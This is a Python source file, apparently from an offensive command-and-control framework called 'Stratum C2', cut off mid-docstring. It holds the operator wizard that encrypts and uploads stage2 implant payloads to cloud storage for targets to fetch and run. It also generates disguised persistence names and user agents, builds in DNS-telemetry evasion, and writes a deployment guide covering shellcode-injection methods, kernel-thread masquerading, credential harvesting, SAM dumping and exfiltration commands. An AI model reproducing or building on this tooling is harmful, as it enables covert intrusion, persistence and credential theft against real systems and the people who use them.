# providers/_wizard.py
# Entropy helpers, BaseConfig, ProviderWizard (Template Method).

import base64
import hashlib
import json
import math
import os
import random as _random
import re
import secrets
import socket
from abc import ABC, abstractmethod
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes as _hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.serialization import (
    Encoding, NoEncryption, PrivateFormat, PublicFormat,
)
from collections import Counter

def _tz_now():
    import core.tz as _core_tz
    return _core_tz.now()

class _TzProxy:
    def now(self):
        return _tz_now()
    def strftime(self, fmt):
        return _tz_now().strftime(fmt)
    def isoformat(self, *a, **kw):
        return _tz_now().isoformat(*a, **kw)

_tz = _TzProxy()


from providers import _p, ask, ask_int, ask_yn, err, info, ok, sep, step, warn
from providers._notifications import _cancelable_run, _check_cancelled
from providers._session import (
    BaseTransport, MZ_MARKER, DOWNLOADS_DIR,
    SessionProfile, Session, SessionManager,
    _load_persist_probe,
)
from providers._monitor import HeartbeatMonitor, AsyncPoller, send_async, _initial_hb_check

from server.version import __version__ as _stratum_version


# ══════════════════════════════════════════════════════════════════════════════
#  ENTROPY HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _entropy(data: bytes) -> float:
    """Shannon entropy in bits per byte (range 0–8)."""
    if not data:
        return 0.0
    c = Counter(data)
    t = len(data)
    return -sum((n / t) * math.log2(n / t) for n in c.values())


# Low-entropy padding blocks appended to generated scripts.
# Content resembles embedded service documentation — entropy ~4.4 bits/byte.
# Values are randomised per-deploy so no two deployments share identical padding.



# Fallback blob paths tried by the Windows Rust agent when the configured path is not writable.
WIN_BLOB_FALLBACK_PATHS: list[str] = [
    "%APPDATA%\\Microsoft\\Windows\\Themes\\.ddb",
    "%APPDATA%\\Microsoft\\Windows\\Recent\\.ddb",
    "%LOCALAPPDATA%\\Microsoft\\Windows\\History\\.ddb",
]

# ══════════════════════════════════════════════════════════════════════════════
#  RANDOM FOLDER NAMES
# ══════════════════════════════════════════════════════════════════════════════

_FOLDER_PREFIXES = [
    "Backup", "Sync", "Archive", "Documents", "Reports",
    "Resources", "Shared", "Data", "Projects", "Files",
    "Assets", "Media", "Content", "Workspace", "Library",
]

_FOLDER_SUFFIXES = [
    "Q1", "Q2", "Q3", "Q4", "2025", "2026",
    "Final", "Draft", "Review", "Production",
    "Team", "Internal", "External", "Client",
    "Main", "Dev", "Staging", "Release",
]


def _random_folder() -> str:
    r = _random.Random(os.urandom(4))
    prefix = r.choice(_FOLDER_PREFIXES)
    if r.random() < 0.5:
        return f"/{prefix}_{r.choice(_FOLDER_SUFFIXES)}"
    return f"/{prefix}{r.randint(1, 99):02d}"


# ══════════════════════════════════════════════════════════════════════════════
#  BASE CONFIG
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class BaseConfig:
    """Common fields shared by every provider's deployment config."""
    folder_path:    str = "/Machine1"
    input_file:     str = "/input.txt"
    output_file:    str = "/output.txt"
    heartbeat_file: str = "/heartbeat.txt"

    blob_path_linux: str = "${HOME}/.config/pulse/.pid"
    blob_path_win:   str = "%APPDATA%\\Microsoft\\Windows\\Themes\\.ddb"

    agent_name_win:   str = ""   # rename EXE/DLL/BIN to this stem (e.g. "RuntimeBroker"); "" = keep default
    agent_name_linux: str = ""   # rename ELF to this stem (e.g. "systemd-resolved"); "" = keep default

    session_label: str = ""     # operator-assigned label for identifying this session

    mode: str = "staged-enc"

    base_sleep:          int = 30
    jitter_percent:      int = 30
    hb_refresh_interval: int = 15
    ip_ext:              str = ""
    window_start:        str = ""
    window_end:          str = ""
    kill_date:           str = ""   # "YYYY-MM-DD" or "" — agent self-destructs on/after this date
    stub_secret:         str = ""
    salt:                str = ""
    session_key:         str = ""   # hex-encoded 32-byte pre-shared key; GCM-wraps aes_key in server→agent direction
    prekey_privs_hex:    str = ""   # hex-encoded concatenated X25519 private keys (prekey pool)
    prekey_pubs_hex:     str = ""   # hex-encoded concatenated X25519 public keys (prekey pool)
    fs_enabled:          bool = True  # forward secrecy enabled (v2 protocol)
    debug_mode:          bool = False

    # Per-deploy cloud filenames — set from pub_key hash in run() to avoid
    # static Stratum fingerprints (.s2l/.s2w/.sk) discoverable via cloud search.
    sk_suffix:  str = ".sk"   # session key file (F3-1); staged-enc only
    s2l_suffix: str = ".s2l"
    s2w_suffix: str = ".s2w"

    s2_uploaded_at: str = ""

    # Per-deployment persist identity — randomised at key-gen time (CRIT-1/CRIT-2).
    persist_suffix:  str = ""   # e.g. ".local/share/a3f7b2c1"
    persist_payload: str = ""   # e.g. ".d4e1c9"
    persist_svc:     str = ""   # e.g. "a3f7b2c1"
    cron_comment:    str = ""   # e.g. "# a3f7b2c1-update"
    rc_comment:      str = ""   # e.g. "# a3f7b2c1-rc"
    task_name:       str = ""   # e.g. "MicrosoftEdgeUpdateTask3f7b2c1" (Windows CRIT-2)
    reg_value:       str = ""   # e.g. "MicrosoftEdgeHelper3f7b2c1"    (Windows CRIT-2)
    ua:              str = ""   # e.g. "Mozilla/5.0 ... Chrome/..."     (HIGH-4)
    staging_prefix:  str = ""   # e.g. "a3f7b2c1"                       (HIGH-12)

    @property
    def sk_path(self)       -> str: return self.folder_path + "/" + self.sk_suffix
    @property
    def s2_path_linux(self) -> str: return self.folder_path + "/" + self.s2l_suffix
    @property
    def s2_path_win(self)   -> str: return self.folder_path + "/" + self.s2w_suffix
    @property
    def poll_timeout(self)  -> int: return self.base_sleep * 3

    def save_creds(self) -> None:   raise NotImplementedError
    def load_creds(self) -> bool:   raise NotImplementedError


# ══════════════════════════════════════════════════════════════════════════════
#  PROVIDER WIZARD  (Template Method)
# ══════════════════════════════════════════════════════════════════════════════


def _resolve_stun_ip() -> str:
    """Resolve STUN server hostname to IPv4 at deploy-time.

    Baking the IP into the agent eliminates the DNS query on the target,
    removing a telemetry event visible to DNS proxies (e.g. Cisco SSE/Umbrella).
    Falls back to the hostname string so the agent degrades gracefully if
    resolution fails on the operator machine.

    NOTE (D7): if the target runs through a VPN or proxy, the STUN/DNS
    fallback will reflect the exit-node IP, not the target's true NIC address.
    The agent reports this as ip_ext; treat it as "IP seen from internet",
    which may differ from target_ip (LAN address) when VPN is active.
    """
    for host in ("stun.l.google.com", "stun1.l.google.com"):
        try:
            infos = socket.getaddrinfo(host, 19302, socket.AF_INET, socket.SOCK_DGRAM)
            if infos:
                return infos[0][4][0]
        except Exception:
            pass
    return "stun.l.google.com"


class ProviderWizard(ABC):
    """Abstract base for all provider deployment wizards.

    run(manager, project_dir) is the single public method.
    It calls abstract hooks in order; providers implement only what differs.
    """

    PROVIDER_ID:   str  = ""
    PROVIDER_NAME: str  = ""
    PROVIDER_ICON: str  = "📡"
    TRANSPORT_DIR: Path = Path(".")   # provider-specific transport functions only

    def __init__(self):
        self._step_n = 0
        self._cloud_cleanup_paths: list = []   # paths uploaded to cloud during this wizard run
        self._cloud_transport: "Optional[BaseTransport]" = None  # transport for rollback deletes

    def _step(self, title: str) -> None:
        self._step_n += 1
        step(str(self._step_n), title)

    # ── abstract hooks ─────────────────────────────────────────────────────────
    # Required: make_config, step_auth, step_init_channel, _make_transport
    # Optional override: _provider_subs, step_upload_stage2, step_upload_stageless_enc

    @abstractmethod
    def make_config(self) -> BaseConfig: ...

    @abstractmethod
    def step_auth(self, cfg: BaseConfig) -> None: ...

    @abstractmethod
    def step_init_channel(self, cfg: BaseConfig) -> None: ...

    @abstractmethod
    def _make_transport(self, cfg: BaseConfig) -> BaseTransport:
        """Instantiate the provider's transport from wizard config."""
        ...

    # Provider credential substitution for scripts removed — native Rust agents
    # receive credentials via STRATUM_* env vars at compile time.
    # _provider_subs kept for backward compat with provider subclasses.

    def _provider_subs(self, cfg: BaseConfig) -> dict:
        return {}

    def _stub_subs(self, cfg: BaseConfig) -> dict:
        return self._provider_subs(cfg)

    def _tracked_upload(self, t: "BaseTransport", path: str, data: bytes) -> None:
        """Upload data and register the cloud path for rollback on wizard error.

        Call this for sensitive artifacts (BK, stage2 blobs) so that a later
        wizard failure causes them to be deleted automatically.  Channel files
        (input/output/heartbeat) created by step_init_channel are not tracked
        because they contain no secret material and overwrite safely.
        """
        self._cloud_transport = t
        t.upload(path, data)
        if path not in self._cloud_cleanup_paths:
            self._cloud_cleanup_paths.append(path)

    # ── concrete upload steps ─────────────────────────────────────────────────
    # Provider-agnostic; delegates upload I/O to self._make_transport(cfg).
    # Override only if your provider needs non-standard upload logic.

    def step_upload_stage2(self, cfg: BaseConfig, agent_dir: Path) -> None:
        """Upload stage2 Rust binaries — called after _step_compile_artifacts."""
        self._step(f"Stage2 Encryption & {self.PROVIDER_NAME} Upload")
        t = self._make_transport(cfg)

        # Linux stage2 — musl-static ELF binary (full agent, compiled as stageless-plain)
        elf_path = agent_dir / "stage2.elf"
        if elf_path.exists():
            elf_bytes  = elf_path.read_bytes()
            s2_lin_enc = self._encrypt_payload_bytes(elf_bytes, cfg.stub_secret)
            ok("Linux stage2 (ELF) encrypted with stub_secret")
            (agent_dir / "stage2_linux.enc").write_text(s2_lin_enc)
            self._tracked_upload(t, cfg.s2_path_linux, s2_lin_enc.encode())
            ok(f"Stage2 Linux   → {self.PROVIDER_NAME}:{cfg.s2_path_linux}  (cancelled at first heartbeat)")
        else:
            warn("Linux stage2 skipped — stub.elf not found after compilation")

        # Windows stage2 — reflective shellcode (embeds agent DLL)
        bin_path = agent_dir / "stub.bin"
        if bin_path.exists():
            bin_bytes  = bin_path.read_bytes()
            s2_win_enc = self._encrypt_payload_bytes(bin_bytes, cfg.stub_secret)
            ok("Windows stage2 (shellcode) encrypted")
            (agent_dir / "stage2_win.enc").write_text(s2_win_enc)
            self._tracked_upload(t, cfg.s2_path_win, s2_win_enc.encode())
            ok(f"Stage2 Windows → {self.PROVIDER_NAME}:{cfg.s2_path_win}")
        else:
            warn("Windows stage2 skipped — stub.bin not found after compilation")

        cfg.s2_uploaded_at = _tz.now().isoformat()

    # stageless-enc is now compiled directly as a native Rust binary —
    # no script generation needed.  The Rust agent is compiled with
    # STRATUM_DEPLOY_MODE=stageless-enc in _step_compile_artifacts().

    # ── extension points ───────────────────────────────────────────────────────

    def _step_configure_extra(self, cfg: BaseConfig) -> None:
        """Override for provider-specific configuration prompts."""
        pass

    def _native_agent_extra_env(self, cfg: BaseConfig) -> dict:
        """Return provider-specific env vars injected into the native agent at compile time.

        Override in provider subclasses.  Keys must match the STRATUM_* names
        expected by agents/native/rust/build.rs:
          STRATUM_APP_KEY, STRATUM_APP_SECRET, STRATUM_REFRESH_TOKEN
        """
        return {}

    @property
    def _creds_filename(self) -> str:
        return f".{self.PROVIDER_ID}_refresh_token"

    @property
    def _global_creds_file(self) -> Path:
        """Shared credentials cache used for wizard re-use prompts (credentials/<provider>).
        After deploy, a per-session copy lives inside the deploy dir."""
        return Path("credentials") / self.PROVIDER_ID

    def _creds_path(self, deploy_dir: Path) -> Path:
        """Return the path to the credentials file used in the session profile.
        Override in provider subclasses that store creds outside the deployment dir."""
        return deploy_dir / self._creds_filename

    # ── concrete provider-agnostic steps ──────────────────────────────────────

    def _step_check_templates(self) -> None:
        self._step("Template Check")
        ok("Rust-only agent — no script templates required")

    def _step_keygen(self, keys_dir: Path, session_id: str, cfg: BaseConfig,
                    key_password: Optional[bytes] = None):
        self._step("RSA Key Generation")
        info("Generating RSA 4096-bit key pair…")
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
        if key_password:
            from cryptography.hazmat.primitives.serialization import BestAvailableEncryption
            encryption = BestAvailableEncryption(key_password)
            ok_suffix = " (encrypted at rest)"
        else:
            encryption = NoEncryption()
            ok_suffix = ""
        priv_pem = private_key.private_bytes(
            Encoding.PEM, PrivateFormat.TraditionalOpenSSL, encryption)
        pub_pem = private_key.public_key().public_bytes(
            Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
        keys_dir.mkdir(parents=True, exist_ok=True)
        (keys_dir / "private_key.pem").write_bytes(priv_pem)
        (keys_dir / "public_key.pem").write_bytes(pub_pem)
        (keys_dir / "private_key.pem").chmod(0o600)
        (keys_dir / "public_key.pem").chmod(0o644)
        self._step_generate_session_key(cfg)
        self._generate_persist_identity(cfg)
        session_key_file = keys_dir / "session_key.hex"
        session_key_file.write_text(cfg.session_key)
        session_key_file.chmod(0o600)
        ok(f"RSA 4096-bit key pair + session_key → keys/{session_id}/{ok_suffix}")
        return priv_pem, pub_pem

    def _step_create_deploy_dir(self, cfg: BaseConfig, session_id: str) -> Path:
        base_dir = Path("deployments")
        base_dir.mkdir(exist_ok=True)
        label = cfg.session_label.replace(" ", "_").replace("/", "_") if cfg.session_label else (cfg.folder_path.strip("/").replace("/", "_") or "default")
        slug  = f"{self.PROVIDER_ID}_{label}_{session_id}"
        deploy_dir = base_dir / slug
        deploy_dir.mkdir(parents=True)
        (deploy_dir / "agent").mkdir()
        ok(f"Deployment directory: {deploy_dir}")
        return deploy_dir

    # LOW-15: update periodically to stay within current browser version distribution
    # Last updated: 2026-06 (Chrome 136, Firefox 138, Edge 136)
    _UA_POOL = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    ]

    def _generate_persist_identity(self, cfg: BaseConfig) -> None:
        """Generate per-deployment random persist strings (CRIT-1 Linux, CRIT-2 Windows, HIGH-4 UA)."""
        tag = secrets.token_hex(4)   # 8 hex chars, e.g. "a3f7b2c1"
        cfg.persist_suffix  = f".local/share/{tag}"
        cfg.persist_payload = f".{secrets.token_hex(3)}"
        cfg.persist_svc     = tag
        cfg.cron_comment    = f"# {tag}-update"
        cfg.rc_comment      = f"# {tag}-rc"
        win_tag = secrets.token_hex(4)
        cfg.task_name  = f"MicrosoftEdgeUpdateTask{win_tag}"
        cfg.reg_value  = f"MicrosoftEdgeHelper{win_tag}"
        cfg.ua             = self._UA_POOL[secrets.randbelow(len(self._UA_POOL))]
        cfg.staging_prefix = secrets.token_hex(4)

    def _step_generate_session_key(self, cfg: BaseConfig) -> None:
        cfg.session_key = secrets.token_bytes(32).hex()
        self._step_generate_prekey_pool(cfg)

    def _step_generate_prekey_pool(self, cfg: BaseConfig, pool_size: int = 8) -> None:
        from providers._epoch import generate_prekey_pool
        pool = generate_prekey_pool(pool_size)
        cfg.prekey_privs_hex = b"".join(priv for priv, _ in pool).hex()
        cfg.prekey_pubs_hex = b"".join(pub for _, pub in pool).hex()

    def _step_generate_stub_secret(self, cfg: BaseConfig) -> None:
        self._step("Stub Secret")
        cfg.stub_secret = secrets.token_hex(32)
        cfg.salt        = secrets.token_hex(16)
        ok("Stub secret generated (baked in stub at compile time — never touches cloud)")

    def _encrypt_payload(self, plaintext: str, password: str) -> str:
        # AES-256-GCM + PBKDF2-SHA256 (HIGH-2: authenticated encryption).
        # Wire format: "SGCM:" + base64(salt[8] + nonce[12] + ciphertext + tag[16])
        salt  = os.urandom(8)
        nonce = os.urandom(12)
        dk    = PBKDF2HMAC(algorithm=_hashes.SHA256(), length=32, salt=salt, iterations=210_000
                           ).derive(password.encode())
        ct_tag = AESGCM(dk).encrypt(nonce, ("STRATUM:" + plaintext).encode(), None)
        return "SGCM:" + base64.b64encode(salt + nonce + ct_tag).decode()

    def _encrypt_payload_bytes(self, data: bytes, password: str) -> str:
        # Same wire format as _encrypt_payload but for raw binary payloads
        # (e.g. Windows stage2 DLL).  No "STRATUM:" text prefix — the Rust
        # loader validates the decrypted payload by checking the MZ magic bytes.
        salt  = os.urandom(8)
        nonce = os.urandom(12)
        dk    = PBKDF2HMAC(algorithm=_hashes.SHA256(), length=32, salt=salt, iterations=210_000
                           ).derive(password.encode())
        ct_tag = AESGCM(dk).encrypt(nonce, data, None)
        return "SGCM:" + base64.b64encode(salt + nonce + ct_tag).decode()

    # Script debug init and VBS launcher removed — native Rust agents use
    # STRATUM_DEBUG env var at compile time instead.

    # Script-based agent generation removed — all deploy modes produce native
    # Rust binaries compiled in _step_compile_artifacts().

    def _step_configure(self, cfg: BaseConfig) -> None:
        self._step("Configuration")

        _p([("", "")])
        _p([("class:yellow", "  Delivery Mode:")])
        _p([("class:info",   "    staged-enc      — stub on target, encrypted stage2 on provider (key baked in stub)")])
        _p([("class:info",   "    stageless-enc   — single encrypted file on target, key baked in stub")])
        _p([("class:info",   "    stageless-plain — cleartext agent on target (no encryption)")])
        _valid_modes = ("staged-enc", "stageless-enc", "stageless-plain")
        while True:
            raw_mode = ask("Mode", cfg.mode, choices=_valid_modes)
            if raw_mode in _valid_modes:
                break
            warn(f"Invalid mode '{raw_mode}' — choose: staged-enc / stageless-enc / stageless-plain")
        cfg.mode = raw_mode

        _p([("", "")])
        _p([("class:yellow", "  Session Label:")])
        _p([("class:info",   "    Human-readable name to identify this session (e.g. target hostname, op name)")])
        cfg.session_label = ask("Label", cfg.session_label)

        _p([("", "")])
        _p([("class:yellow", "  Channel Paths:")])
        if ask_yn("Randomize folder path (OPSEC: avoids static folder fingerprint)", default=False):
            cfg.folder_path = _random_folder()
            ok(f"Random folder: {cfg.folder_path}")
        else:
            fp = ask("Folder path", cfg.folder_path)
            if not fp.startswith("/"):
                fp = "/" + fp
            cfg.folder_path = fp.rstrip("/")
        cfg.input_file     = ask("Input file",     cfg.input_file)
        cfg.output_file    = ask("Output file",    cfg.output_file)
        cfg.heartbeat_file = ask("Heartbeat file", cfg.heartbeat_file)

        _p([("", "")])
        _p([("class:yellow", "  Agent Timing:")])
        cfg.base_sleep     = ask_int("Base sleep seconds (1-86400)", cfg.base_sleep, 1, 86400)
        cfg.jitter_percent = ask_int("Jitter percent (0-50)",        cfg.jitter_percent, 0, 50)

        _p([("", "")])
        _p([("class:yellow", "  Payload Blob Paths (on target machine):")])
        cfg.blob_path_linux = ask("Linux blob path",   cfg.blob_path_linux)
        cfg.blob_path_win   = ask("Windows blob path", cfg.blob_path_win)

        _p([("", "")])
        _p([("class:yellow", "  Time-Window Lock (HH:MM — empty to disable):")])
        cfg.window_start = ask("Window start (e.g. 08:00)", cfg.window_start)
        if cfg.window_start:
            cfg.window_end = ask("Window end   (e.g. 18:00)", cfg.window_end)
        else:
            cfg.window_end = ""

        _p([("", "")])
        _p([("class:yellow", "  Kill Date (YYYY-MM-DD — empty to disable):")])
        _p([("class:info",   "    Agent self-destructs (removes persist + binary) on or after this date")])
        cfg.kill_date = ask("Kill date (e.g. 2026-12-31)", cfg.kill_date)
        # Basic format validation — non-blocking, agent ignores malformed values
        if cfg.kill_date:
            import re as _re
            if not _re.match(r"^\d{4}-\d{2}-\d{2}$", cfg.kill_date):
                cfg.kill_date = ""

        _p([("", "")])
        _p([("class:yellow", "  Debug Mode:")])
        _p([("class:info",   "    WARNING: debug=yes embeds print statements — avoid in operational builds")])
        cfg.debug_mode = ask_yn("Enable debug output (operational: no)", cfg.debug_mode)

        self._step_configure_extra(cfg)
        self._show_config(cfg)
        self._print_mode_diagram(cfg)

    def _show_config(self, cfg: BaseConfig) -> None:
        W = 52
        _p([("", "")])
        _p([("class:cyan", "  ┌" + "─" * W + "┐")])
        _p([("class:cyan", "  │"), ("class:bold", f"{'  CONFIGURATION RECAP':^{W}}"), ("class:cyan", "│")])
        _p([("class:cyan", "  ├" + "─" * W + "┤")])

        def _row(label, value, vc="class:green"):
            lbl = f"  {label:<12}"
            pad = W - len(lbl) + 2 - len(str(value)) - 2
            _p([("class:cyan",   "  │"),
                ("class:yellow", f"  {label:<12}"),
                (vc,             str(value)),
                ("class:dim",    " " * max(pad, 0)),
                ("class:cyan",   "│")])

        _row("Mode",      cfg.mode, "class:bold")
        _row("Debug",     "ENABLED" if cfg.debug_mode else "off",
             "class:red" if cfg.debug_mode else "class:dim")
        _row("Provider",  self.PROVIDER_NAME)
        if cfg.session_label:
            _row("Label",     cfg.session_label)
        _row("Folder",    cfg.folder_path)
        _row("Input",     cfg.folder_path + cfg.input_file)
        _row("Output",    cfg.folder_path + cfg.output_file)
        _row("Heartbeat", cfg.folder_path + cfg.heartbeat_file)
        _row("Sleep",     f"{cfg.base_sleep}s  +/-{cfg.jitter_percent}%")
        if cfg.window_start:
            _row("Window",  f"{cfg.window_start} → {cfg.window_end}")
        if cfg.kill_date:
            _row("Kill date", cfg.kill_date, "class:red")
        _p([("class:cyan", "  └" + "─" * W + "┘")])
        _p([("", "")])

    def _print_mode_diagram(self, cfg: BaseConfig) -> None:
        Y, I = "class:yellow", "class:info"
        DIAGRAMS = {
            "staged-enc": [
                (Y, " ── STAGED-ENC ────────────────────────────────────────────────────────"),
                (I, "   OPERATOR                   CLOUD                      TARGET"),
                (I, "         │─── .s2l (enc) ─────>│  [key baked in stub]   │"),
                (I, "         │                     │<─── fetch .s2l ────────│  (ddb miss)"),
                (I, "         │                     │──── .s2l ─────────────>│  decrypt + exec"),
                (I, "         │<────── heartbeat (cancels .s2l) ─────────────│"),
                (I, "         │──────── command ────────────────────────────>│"),
                (I, "         │<────── output ───────────────────────────────│"),
                (Y, " ─────────────────────────────────────────────────────────────────────"),
            ],
            "stageless-enc": [
                (Y, " ── STAGELESS-ENC ─────────────────────────────────────────────────────"),
                (I, "      OPERATOR                CLOUD                      TARGET"),
                (I, "         │─── agent_stageless ─────────────────────────>│  embedded payload"),
                (I, "         │                     │         [key baked in stub, decrypt + exec]"),
                (I, "         │<────── heartbeat ────────────────────────────│"),
                (I, "         │──────── command ────────────────────────────>│"),
                (Y, " ─────────────────────────────────────────────────────────────────────"),
            ],
            "stageless-plain": [
                (Y, " ── STAGELESS-PLAIN ───────────────────────────────────────────────────"),
                (I, "   OPERATOR                   CLOUD                      TARGET"),
                (I, "         │─── agent.elf/.exe ──────────────────────────>│  native binary, exec directly"),
                (I, "         │<────── heartbeat ────────────────────────────│"),
                (I, "         │──────── command ────────────────────────────>│"),
                (Y, " ─────────────────────────────────────────────────────────────────────"),
            ],
        }
        _p([("", "")])
        for color, line in DIAGRAMS.get(cfg.mode, []):
            _p([(color, "  " + line)])
        _p([("", "")])

    def _step_generate_docs(self, cfg: BaseConfig, deploy_dir: Path,
                            session_id: str) -> None:
        agent_dir = deploy_dir / "agent"
        fp        = cfg.folder_path

        if cfg.mode == "staged-enc":
            _base = "stub"
            arch         = "ARCHITECTURE: STAGED ENCRYPTED PAYLOAD (key baked in stub)\n"
        elif cfg.mode == "stageless-enc":
            _base = "agent_stageless"
            arch         = "ARCHITECTURE: STAGELESS ENCRYPTED (key baked in stub)\n"
        else:
            _base = "agent"
            arch         = "ARCHITECTURE: STAGELESS PLAIN\n"

        w = cfg.agent_name_win or _base
        l = cfg.agent_name_linux or _base

        common = (
            f"  Provider:  {self.PROVIDER_NAME}\n  Mode:      {cfg.mode}\n"
            + (f"  Label:     {cfg.session_label}\n" if cfg.session_label else "")
            + f"  Folder:    {fp}\n  Input:     {fp}{cfg.input_file}\n"
            f"  Output:    {fp}{cfg.output_file}\n  Heartbeat: {fp}{cfg.heartbeat_file}\n"
            f"  Sleep:     {cfg.base_sleep}s +/-{cfg.jitter_percent}%\n"
            + (f"  Window:    {cfg.window_start} → {cfg.window_end}\n" if cfg.window_start else "")
            + (f"  Kill date: {cfg.kill_date}\n" if cfg.kill_date else "")
        )

        deploy_linux = (
            f"  scp {deploy_dir}/agent/{l}.elf user@target:/tmp/\n"
            f"  ssh user@target 'chmod +x /tmp/{l}.elf && nohup /tmp/{l}.elf &>/dev/null &'\n"
        )

        deploy_win = (
            f"  {w}.exe                                            (direct execution)\n"
            f"  start /b {w}.exe                                    (background, no new window)\n"
        )

        tradecraft_dll = (
            f"\n  DLL TRADECRAFT:\n"
            f"  The DLL ({w}.dll) exports DllMain, Run, and DllRegisterServer.\n"
            f"  Any method below starts the agent in a background thread.\n\n"
            f"    rundll32.exe {w}.dll,Run                          (classic — runs via exported Run)\n"
            f"    regsvr32 /s {w}.dll                               (COM registration — calls DllRegisterServer)\n"
            f"    regsvr32 /s /n /i {w}.dll                         (silent, /n skips DllRegisterServer entry)\n"
        )

        tradecraft_shellcode = (
            f"\n  SHELLCODE TRADECRAFT:\n"
            f"  The .bin ({w}.bin) is x64 position-independent shellcode that embeds\n"
            f"  the DLL and reflective-loads it in-memory (no file on disk, no LoadLibrary).\n\n"
            f"    Use with any shellcode injector:\n"
            f"    - CreateRemoteThread into a sacrificial process\n"
            f"    - QueueUserAPC / NtQueueApcThread (early bird)\n"
            f"    - Callback-based (EnumWindows, CertEnumSystemStore, etc.)\n"
            f"    - Fiber / ThreadPoolWait injection\n"
            f"    - Module stomping (load benign DLL, overwrite .text with shellcode)\n"
            f"    - Syscall-based injection (direct/indirect NtAllocateVirtualMemory + NtCreateThreadEx)\n"
            f"    Example (Python):\n"
            f"      with open('{w}.bin','rb') as f: sc = f.read()\n"
            f"      # inject sc into target process\n"
        )

        tradecraft_exe = (
            f"\n  EXE TRADECRAFT:\n"
            f"  The EXE ({w}.exe) is a standard PE. It can run directly or be used\n"
            f"  with execution proxies:\n\n"
            f"    {w}.exe                                           (direct execution)\n"
            f"    start /b {w}.exe                                  (background, no new window)\n"
            f"    wmic process call create \"{w}.exe\"                (WMI process create)\n"
            f"    schtasks /create /tn \"Update\" /tr \"{w}.exe\" /sc once /st 00:00  (scheduled task)\n"
        )

        tradecraft_elf = (
            f"\n  ELF TRADECRAFT:\n"
            f"  The ELF ({l}.elf) is a static musl binary — zero runtime deps,\n"
            f"  runs on any x86_64 Linux (no glibc/ld-linux required).\n\n"
            f"    chmod +x {l}.elf && nohup ./{l}.elf &>/dev/null &  (background, survives logout)\n"
            f"    setsid ./{l}.elf &>/dev/null &                     (new session leader, fully detached)\n"
            f"    (exec -a [kworker/0:1] ./{l}.elf &)               (masquerade as kernel thread)\n"
            f"    screen -dmS sess ./{l}.elf                        (inside screen, if available)\n"
            f"    at now <<< './{l}.elf'                             (via at daemon, different parent)\n"
        )

        tradecraft_script = ""

        guide = (
            "=== STRATUM C2 — DEPLOYMENT GUIDE ===\n\n"
            f"Session ID: {session_id}\n"
            f"Generated:  {_tz.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            + arch + "\nCONFIGURATION:\n" + common
            + "\n" + "=" * 60 + "\n"
            + "DEPLOY ON TARGET:\n"
            + "\n  Linux:\n" + deploy_linux
            + "\n  Windows:\n" + deploy_win
            + "\n" + "=" * 60 + "\n"
            + "TRADECRAFT — EXECUTION METHODS:\n"
            + tradecraft_exe
            + tradecraft_dll
            + tradecraft_shellcode
            + tradecraft_elf
            + tradecraft_script
            + "\n" + "=" * 60 + "\n"
            + "POST-DEPLOY:\n"
            + "  /sleep <seconds>   — change beacon interval\n"
            + "  /jitter <percent>  — add randomization to sleep\n"
            + "  /persist probe     — enumerate persistence opportunities\n"
            + "  /persist <method>  — install persistence (schtask/registry/cron/systemd)\n"
            + "  /creds harvest     — passive credential collection (51 sources)\n"
            + "  /creds sam         — dump SAM hashes (requires admin/SYSTEM)\n"
            + "  /download <path>   — exfiltrate file via staging\n"
            + "  /upload <path>     — upload file to target\n"
            + "  /sysinfo           — full target reconnaissance\n"
            + "\nTERMINATE AGENT:\n  /kill  (inside controller)\n"
        )
        (deploy_dir / "DEPLOYMENT_GUIDE.txt").write_text(guide)
        (agent_dir / "README.txt").write_text(
            f"=== AGENT — {cfg.mode.upper()} ===\n\n" + arch + "\n" + common
            + "\nDEPLOY:\n  Linux:\n" + deploy_linux + "\n  Windows:\n" + deploy_win
            + tradecraft_exe + tradecraft_dll + tradecraft_shellcode
            + tradecraft_elf + tradecraft_script
        )
        ok("DEPLOYMENT_GUIDE.txt + agent/README.txt generated")

    def _step_summary(self, cfg: BaseConfig, deploy_dir: Path, session_id: str) -> None:
        _p([("", "")])
        _p([("class:green", "  +=================================================================+")])
        _p([("class:green", "  |      DEPLOYMENT COMPLETE — SESSION ACTIVE IN CONTROLLER        |")])
        _p([("class:green", "  +=================================================================+")])
        _p([("", "")])
        _p([("class:cyan",   f"  Session ID:  {session_id}")])
        if cfg.session_label:
            _p([("class:cyan",   f"  Label:       {cfg.session_label}")])
        _p([("class:cyan",   f"  Provider:    {self.PROVIDER_NAME}")])
        _p([("class:cyan",   f"  Channel:     {cfg.folder_path + cfg.input_file}")])
        _p([("class:cyan",   f"  Mode:        {cfg.mode}")])
        _p([("", "")])
        _p([("class:yellow", "  Agent artifacts:")])
        info(f"  {deploy_dir}/agent/")
        _p([("", "")])
        _p([("class:yellow", "  Next step:")])
        info("  Deploy the agent/stub on the target (see DEPLOYMENT_GUIDE.txt)")
        info(f"  Then: interact {session_id}")
        _p([("", "")])
        ok("Done.")
        _p([("", "")])

    # ── compiled artifact generation ──────────────────────────────────────────

    def _step_compile_artifacts(self, cfg: BaseConfig, agent_dir: Path,
                                pub_pem: bytes = b"") -> None:
        """
        Compile native Rust agent binaries — one artifact per platform, no interpreters.

        Produces (where toolchain is available):
          agent.exe — native Rust PE, MSVC-ABI (clang-cl + lld-link + xwin SDK)
          agent.dll — cdylib variant, same toolchain
          agent.bin — x64 reflective shellcode (embeds + loads agent.exe in-memory, no PS)
